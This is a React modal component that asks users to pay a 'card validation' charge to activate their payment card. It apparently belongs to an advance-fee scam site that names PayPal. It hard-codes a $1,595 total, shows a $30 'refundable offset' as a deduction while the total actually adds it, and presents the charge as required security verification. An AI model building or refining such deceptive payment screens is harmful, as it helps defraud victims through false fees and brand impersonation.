"use client"

import { useState, useEffect } from "react"
import { CreditCard, Shield, AlertCircle } from "lucide-react"
import api from "../../../../utils/api"


export default function CardValidationModal({ card, user, onClose, onValidationRequested }) {
    const [loading, setLoading] = useState(false)
    const [agreed, setAgreed] = useState(false)
    const [fees, setFees] = useState(null)
    const [feesLoading, setFeesLoading] = useState(true)
    const [error, setError] = useState("")

    // Fetch card validation fees from backend
    useEffect(() => {
        fetchCardValidationFees()
    }, [])

    const fetchCardValidationFees = async () => {
        try {
            setFeesLoading(true)
            const response = await api.get('/user/card-validation-fees')
            
            if (response.data.success) {
                setFees(response.data.data)
            } else {
                setError("Failed to load validation fees")
                // Fallback to default values
                setDefaultFees()
            }
        } catch (error) {
            console.error('Error fetching card validation fees:', error)
            setError("Unable to load fees. Please try again.")
            setDefaultFees()
        } finally {
            setFeesLoading(false)
        }
    }

    const setDefaultFees = () => {
        setFees({
            verification_fee: 1500.00,
            otp_auth_fee: 65.00,
            refundable_offset: 30.00,
            total_amount: 1595.00,
            validation_enabled: true
        })
    }

    const formatCurrency = (amount) => {
        const currencySymbol = user?.currency || '$'
        const amountFormatted = new Intl.NumberFormat('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        }).format(amount || 0)
        
        return `${currencySymbol}${amountFormatted}`
    }

    const getCurrencyName = (currencySymbol) => {
        const currencies = {
            '$': 'US Dollar',
            '€': 'Euro',
            '£': 'British Pound',
            '¥': 'Japanese Yen',
            'CA$': 'Canadian Dollar',
            'A$': 'Australian Dollar',
            'CHF': 'Swiss Franc',
            'CN¥': 'Chinese Yuan',
            '₹': 'Indian Rupee',
            'S$': 'Singapore Dollar',
            'HK$': 'Hong Kong Dollar',
            'kr': 'Swedish Krona',
            'NZ$': 'New Zealand Dollar',
            'MX$': 'Mexican Peso',
            'R$': 'Brazilian Real',
            '₽': 'Russian Ruble',
            'R': 'South African Rand'
        }
        return currencies[user?.currency || '$'] || 'US Dollar'
    }

    const handleSubmit = async (e) => {
        e.preventDefault()
        setLoading(true)

        try {
            // Simulate API call
            await new Promise(resolve => setTimeout(resolve, 1000))
            
            // Pass validation data to parent
            onValidationRequested({
                cardHolderName: user?.name || "Card Holder",
                cardLastFour: card.last_four,
                cardBrand: card.brand,
                verificationFee: fees?.verification_fee || 1500.00,
                otpAuthFee: fees?.otp_auth_fee || 65.00,
                refundableOffset: fees?.refundable_offset || 30.00,
                totalAmount: fees?.total_amount || 1595.00,
                referenceId: "CARDVAL" + Date.now(),
                timestamp: new Date().toISOString(),
                currency: user?.currency || '$'
            })
        } catch (error) {
            console.error('Validation request failed:', error)
            setError("Validation request failed. Please try again.")
        } finally {
            setLoading(false)
        }
    }

    if (feesLoading) {
        return (
            <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
                <div className="bg-white rounded-lg w-full max-w-2xl p-6">
                    <div className="flex justify-center items-center h-64">
                        <div className="text-center">
                            <div className="animate-spin h-10 w-10 rounded-full border-b-2 border-blue-600 mx-auto mb-4"></div>
                            <p className="text-gray-600">Loading validation fees...</p>
                        </div>
                    </div>
                </div>
            </div>
        )
    }

    if (!fees?.validation_enabled) {
        return (
            <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
                <div className="bg-white rounded-lg w-full max-w-2xl p-6">
                    <div className="text-center">
                        <div className="mb-4 p-3 bg-yellow-100 rounded-full w-16 h-16 flex items-center justify-center mx-auto">
                            <AlertCircle className="h-8 w-8 text-yellow-600" />
                        </div>
                        <h3 className="text-xl font-bold text-gray-900 mb-2">
                            Card Validation Temporarily Unavailable
                        </h3>
                        <p className="text-gray-600 mb-6">
                            The card validation service is currently under maintenance. Please try again later.
                        </p>
                        <button
                            onClick={onClose}
                            className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
                        >
                            Close
                        </button>
                    </div>
                </div>
            </div>
        )
    }

    return (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
            <div className="bg-white rounded-lg w-full max-w-2xl max-h-[90vh] overflow-y-auto">
                <div className="p-6">
                    {/* Header */}
                    <div className="flex items-center gap-3 mb-6">
                        <div className="p-2 bg-blue-100 rounded-lg">
                            <Shield className="h-6 w-6 text-blue-600" />
                        </div>
                        <div>
                            <h3 className="text-xl font-bold text-gray-900">Card Validation Service Activation</h3>
                            <p className="text-gray-600 text-sm">
                                Verify and activate your {card.brand} card ending in {card.last_four}
                            </p>
                        </div>
                    </div>

                    {error && (
                        <div className="mb-6 p-4 bg-red-50 border border-red-200 rounded-lg">
                            <p className="text-red-700 text-sm">{error}</p>
                        </div>
                    )}

                    {/* Warning Alert */}
                    <div className="mb-6 p-4 bg-yellow-50 border border-yellow-200 rounded-lg">
                        <div className="flex items-start gap-3">
                            <AlertCircle className="h-5 w-5 text-yellow-600 mt-0.5" />
                            <div>
                                <p className="font-semibold text-yellow-800 mb-2">Important Notice</p>
                                <p className="text-yellow-700 text-sm">
                                    Card validation is required to activate your payment method for secure transactions. 
                                    This one-time fee ensures your card is fully authenticated and integrated with our secure payment gateway.
                                </p>
                            </div>
                        </div>
                    </div>

                    {/* Fees Breakdown */}
                    <div className="mb-6 bg-gray-50 rounded-lg p-5 border border-gray-200">
                        <div className="flex justify-between items-center mb-4">
                            <h4 className="font-semibold text-gray-900">Validation Charges</h4>
                            <div className="text-xs text-gray-500">
                                Currency: {getCurrencyName(user?.currency || '$')}
                            </div>
                        </div>
                        
                        <div className="space-y-3">
                            <div className="flex justify-between items-center">
                                <div>
                                    <p className="font-medium">Card Verification & Payment Method Activation</p>
                                    <p className="text-sm text-gray-600">One-time setup and security verification</p>
                                </div>
                                <p className="font-semibold">{formatCurrency(fees?.verification_fee || 0)}</p>
                            </div>
                            
                            <div className="flex justify-between items-center border-t border-gray-200 pt-3">
                                <div>
                                    <p className="font-medium">OTP Authentication & Code Verification</p>
                                    <p className="text-sm text-gray-600">Secure 2-factor authentication setup</p>
                                </div>
                                <p className="font-semibold">{formatCurrency(fees?.otp_auth_fee || 0)}</p>
                            </div>
                            
                            <div className="flex justify-between items-center border-t border-gray-200 pt-3">
                                <div>
                                    <p className="font-medium">Refundable Verification Offset</p>
                                    <p className="text-sm text-gray-600">(Refunded upon successful validation)</p>
                                </div>
                                <p className="font-semibold text-green-600">-{formatCurrency(fees?.refundable_offset || 0)}</p>
                            </div>
                            
                            <div className="flex justify-between items-center border-t border-gray-300 pt-4">
                                <div>
                                    <p className="text-lg font-bold">TOTAL AMOUNT DUE</p>
                                </div>
                                <div className="text-right">
                                    <p className="text-2xl font-bold text-gray-900">
                                        {formatCurrency(fees?.total_amount || 0)}
                                    </p>
                                    <p className="text-sm text-gray-600">
                                        {getCurrencyName(user?.currency || '$')}
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>

                    {/* Terms & Conditions */}
                    <div className="mb-6">
                        <div className="flex items-start gap-3 mb-4">
                            <input
                                type="checkbox"
                                id="terms"
                                checked={agreed}
                                onChange={(e) => setAgreed(e.target.checked)}
                                className="mt-1"
                            />
                            <label htmlFor="terms" className="text-sm text-gray-700">
                                I understand and agree that this validation fee is required to activate my payment card for secure transactions. 
                                I acknowledge that the {formatCurrency(fees?.refundable_offset || 30.00)} offset will be refunded to my account upon successful validation. 
                                I authorize PayPal to process this validation charge for card activation services.
                            </label>
                        </div>
                    </div>

                    {/* Action Buttons */}
                    <div className="flex gap-3">
                        <button
                            onClick={onClose}
                            className="flex-1 px-4 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-colors"
                        >
                            Cancel
                        </button>
                        <button
                            onClick={handleSubmit}
                            disabled={!agreed || loading}
                            className="flex-1 px-4 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                        >
                            {loading ? 'Processing...' : 'Proceed with Validation'}
                        </button>
                    </div>
                </div>
            </div>
        </div>
    )
}